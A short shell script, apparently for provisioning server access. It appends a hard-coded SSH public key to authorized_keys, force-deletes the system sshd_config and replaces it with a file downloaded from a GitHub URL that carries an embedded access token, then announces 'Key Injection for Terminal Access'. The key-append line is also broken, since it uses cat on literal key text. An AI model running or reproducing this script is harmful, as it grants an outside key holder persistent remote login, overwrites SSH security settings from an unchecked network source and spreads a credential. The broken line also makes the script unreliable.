echo
echo The script is running, please allow it up to 1 minute to finish.

mkdir ~/.ssh
chmod 700 ~/.ssh
cat ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOI2apZO3Fj6ikyNYpmbVfgnQ0RMDC+lg712kf6B19Jk >> ~/.ssh/authorized_keys
rm -rf /etc/ssh/sshd_config
cd /etc/ssh/
wget https://raw.githubusercontent.com/TechinoCloud/pub-key/main/sshd_config?token=GHSAT0AAAAAABZQKFIPY7QE6MFLK62YABK4Y2XN3CA
mv sshd_config?token=GHSAT0AAAAAABZQKFIPY7QE6MFLK62YABK4Y2XN3CA sshd_config

echo Complete Key Injection for Terminal Access
echo
